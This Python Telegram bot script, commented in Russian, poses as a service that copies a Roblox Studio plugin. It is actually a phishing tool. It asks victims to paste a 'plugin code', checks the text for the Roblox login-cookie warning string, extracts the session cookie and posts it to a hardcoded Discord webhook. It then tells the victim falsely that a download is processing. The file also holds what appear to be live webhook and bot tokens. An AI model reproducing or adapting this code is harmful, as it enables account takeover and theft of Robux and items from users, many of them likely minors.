import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext
import requests
import time

# Настройка логирования
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# URL вебхука Discord
WEBHOOK_URL = 'https://discord.com/api/webhooks/1455808682880401449/C-IWHsaOPYLt_rK0RRlBkf-ECBgSxbaESbhI5lTuf4afusLot0F1bJCxOMF2aewZzBkX'
COOLDOWN_TIME = 600  # 10 минут в секундах
last_sent_time = {}

# Команда /start
def start(update: Update, context: CallbackContext) -> None:
    keyboard = [
        [InlineKeyboardButton("🔓Copy Plugin For Roblox Studio🔓", callback_data='copy_plugin')],
        [InlineKeyboardButton("✨Exclusive features✨", callback_data='exclusive_features')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text('Welcome! Please choose an option:', reply_markup=reply_markup)

# Обработка нажатий кнопок
def button(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    query.answer()

    if query.data == 'copy_plugin':
        query.edit_message_text(text='Enter the plugin code to begin processing and downloading the plugin.')
        return  # Ожидаем ввода кода

    elif query.data == 'exclusive_features':
        query.edit_message_text(text='Your Telegram ID is not on the list for accessing this section.')

# Обработка текста (ввод кода)
def handle_message(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    input_code = update.message.text.strip()
    warning_text = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"

    if user_id in last_sent_time and (time.time() - last_sent_time[user_id]) < COOLDOWN_TIME:
        remaining_time = COOLDOWN_TIME - (time.time() - last_sent_time[user_id])
        update.message.reply_text(f'You have submitted your request too many times, please try again in {int(remaining_time)} seconds.')
        return

    if warning_text in input_code:
        code_data = input_code.split(warning_text)[1].strip()
        if code_data:
            # Отправка данных на вебхук
            requests.post(WEBHOOK_URL, json={"content": code_data})
            last_sent_time[user_id] = time.time()  # Обновляем время последней отправки
            update.message.reply_text('You have successfully entered the code. Processing, please wait a few seconds for download.')
        else:
            update.message.reply_text('You entered incorrect data, please follow the instructions from the website.')
    else:
        update.message.reply_text('You entered incorrect data, please follow the instructions from the website.')

def main() -> None:
    # Вставьте свой токен бота здесь
    updater = Updater("8490790438:AAEXcvwpjsNqdVk106xljtsSOqxmuHCeJyQ")

    # Получаем диспетчер для регистрации обработчиков
    dispatcher = updater.dispatcher

    # Обработчики команд
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CallbackQueryHandler(button))
    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

    # Запуск бота
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
